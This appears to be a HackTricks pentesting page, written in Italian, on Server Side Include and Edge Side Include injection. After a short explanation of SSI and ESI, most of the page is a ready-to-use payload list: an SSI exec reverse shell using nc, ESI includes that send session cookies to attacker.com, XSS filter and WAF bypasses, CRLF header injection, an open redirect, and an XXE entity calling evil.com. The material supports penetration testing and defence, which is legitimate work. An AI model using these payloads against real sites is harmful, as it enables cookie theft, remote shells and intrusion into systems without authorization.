# Server Side Inclusion/Edge Side Inclusion Injection

{{#include ../banners/hacktricks-training.md}}

## Server Side Inclusion Informazioni di Base

**(Introduzione tratta da** [**Apache docs**](https://httpd.apache.org/docs/current/howto/ssi.html)**)**

SSI (Server Side Includes) sono direttive che vengono **posizionate nelle pagine HTML e valutate sul server** mentre le pagine vengono servite. Ti permettono di **aggiungere contenuti generati dinamicamente** a una pagina HTML esistente, senza dover servire l'intera pagina tramite un programma CGI o un'altra tecnologia dinamica.\
Ad esempio, potresti inserire una direttiva in una pagina HTML esistente, come:

`<!--#echo var="DATE_LOCAL" -->`

E, quando la pagina viene servita, questo frammento verrà valutato e sostituito con il suo valore:

`Martedì, 15-gen-2013 19:28:54 EST`

La decisione su quando utilizzare SSI e quando far generare completamente la tua pagina da un programma è solitamente una questione di quanto della pagina è statico e quanto deve essere ricalcolato ogni volta che la pagina viene servita. SSI è un ottimo modo per aggiungere piccoli pezzi di informazione, come l'ora corrente - mostrata sopra. Ma se la maggior parte della tua pagina viene generata al momento in cui viene servita, devi cercare un'altra soluzione.

Puoi dedurre la presenza di SSI se l'applicazione web utilizza file con l'estensione&#x73;**`.shtml`, `.shtm` o `.stm`**, ma non è solo questo il caso.

Un'espressione SSI tipica ha il seguente formato:
```
<!--#directive param="value" -->
```
### Controlla
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

C'è un problema **nella memorizzazione nella cache delle informazioni o delle applicazioni dinamiche** poiché parte del contenuto potrebbe essere **varia** per la prossima volta che il contenuto viene recuperato. Questo è ciò per cui viene utilizzato **ESI**, per indicare utilizzando i tag ESI il **contenuto dinamico che deve essere generato** prima di inviare la versione memorizzata nella cache.\
Se un **attaccante** è in grado di **iniettare un tag ESI** all'interno del contenuto memorizzato nella cache, allora potrebbe essere in grado di **iniettare contenuto arbitrario** nel documento prima che venga inviato agli utenti.

### ESI Detection

Il seguente **header** in una risposta dal server significa che il server sta utilizzando ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Se non riesci a trovare questo header, il server **potrebbe comunque utilizzare ESI**.\
Un **approccio di sfruttamento cieco può essere utilizzato** poiché una richiesta dovrebbe arrivare al server degli attaccanti:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI exploitation

[GoSecure ha creato](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) una tabella per comprendere i possibili attacchi che possiamo provare contro diversi software compatibili con ESI, a seconda delle funzionalità supportate:

- **Includes**: Supporta la direttiva `<esi:includes>`
- **Vars**: Supporta la direttiva `<esi:vars>`. Utile per bypassare i filtri XSS
- **Cookie**: I cookie del documento sono accessibili al motore ESI
- **Upstream Headers Required**: Le applicazioni surrogate non elaboreranno le dichiarazioni ESI a meno che l'applicazione upstream non fornisca le intestazioni
- **Host Allowlist**: In questo caso, gli include ESI sono possibili solo da host server autorizzati, rendendo SSRF, ad esempio, possibile solo contro quegli host

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |     Yes      |   Yes    |     Yes     |              Yes              |         No         |
|        Varnish Cache         |     Yes      |    No    |     No      |              Yes              |        Yes         |
|            Fastly            |     Yes      |    No    |     No      |              No               |        Yes         |
| Akamai ESI Test Server (ETS) |     Yes      |   Yes    |     Yes     |              No               |         No         |
|          NodeJS esi          |     Yes      |   Yes    |     Yes     |              No               |         No         |
|        NodeJS nodesi         |     Yes      |    No    |     No      |              No               |      Optional      |

#### XSS

La seguente direttiva ESI caricherà un file arbitrario all'interno della risposta del server
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Bypass client XSS protection
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Rubare Cookie

- Rubare cookie da remoto
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
- Rubare il cookie HTTP_ONLY con XSS riflettendolo nella risposta:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### File Locale Privato

Non confondere questo con un "Local File Inclusion":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Il seguente aggiungerà un'intestazione `Location` alla risposta
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Aggiungi intestazione

- Aggiungi intestazione nella richiesta forzata
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
- Aggiungi intestazione nella risposta (utile per bypassare "Content-Type: text/json" in una risposta con XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF nell'intestazione Add (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Debug di Akamai

Questo invierà informazioni di debug incluse nella risposta:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

È possibile utilizzare la sintassi di **`eXtensible Stylesheet Language Transformations (XSLT)`** in ESI semplicemente indicando il valore del param **`dca`** come **`xslt`**. Questo potrebbe consentire di abusare di **XSLT** per creare e sfruttare una vulnerabilità di Entità Estera XML (XXE):
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT file:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Controlla la pagina XSLT:

{{#ref}}
xslt-server-side-injection-extensible-stylesheet-language-transformations.md
{{#endref}}

### Riferimenti

- [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
- [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
- [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Elenco di Rilevamento Brute-Force

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt
{{#endref}}

{{#include ../banners/hacktricks-training.md}}
